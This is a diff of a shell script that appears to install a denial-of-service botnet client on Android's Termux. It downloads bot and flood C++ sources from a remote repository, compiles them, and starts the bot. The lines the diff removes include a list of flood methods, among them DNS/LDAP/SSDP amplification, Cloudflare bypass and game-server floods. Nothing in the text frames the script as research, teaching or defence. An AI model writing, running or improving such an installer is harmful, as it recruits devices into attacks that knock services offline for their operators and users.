@@ -34,26 +34,15 @@ fi
 echo "[*] Downloading sources from repository..."
 curl -s -L "${REPO_BASE}/bots/bot.cpp?t=$(date +%s)" -o bot.cpp
 curl -s -L "${REPO_BASE}/bots/flood.cpp?t=$(date +%s)" -o flood.cpp
-curl -s -L "${REPO_BASE}/bots/http.cpp?t=$(date +%s)" -o http.cpp
-curl -s -L "${REPO_BASE}/bots/https.cpp?t=$(date +%s)" -o https.cpp
 curl -s -L "${REPO_BASE}/agent.txt?t=$(date +%s)" -o agent.txt
 
 # 3. Compile sources natively for Termux architecture
 echo "[*] Compiling bot binaries for $(uname -m)..."
 clang++ -O2 -o bot bot.cpp
 clang++ -O2 -pthread -o flood flood.cpp -lssl -lcrypto
-clang++ -O2 -pthread -o http http.cpp
-clang++ -O2 -pthread -o https https.cpp -lssl -lcrypto
 
-chmod +x bot flood http https
+chmod +x bot flood
 
-# 4. Create symlinks for all attack methods
-METHODS="dns udp ldap ssdp home udpbypass tcp socket ovh tcpmix tcpbypass ack game rainbow rocket roblox fivem pubg fortnite warthunder counter samp subnet icmp http https httpx rapidflood tls tlsx bypass browser cache cloudflare"
-
-for m in $METHODS; do
-    ln -sf flood "$m"
-done
-
-echo "[+] Compilation & method setup successful!"
+echo "[+] Compilation successful!"
 echo "[+] Starting Bot process..."
 ./bot
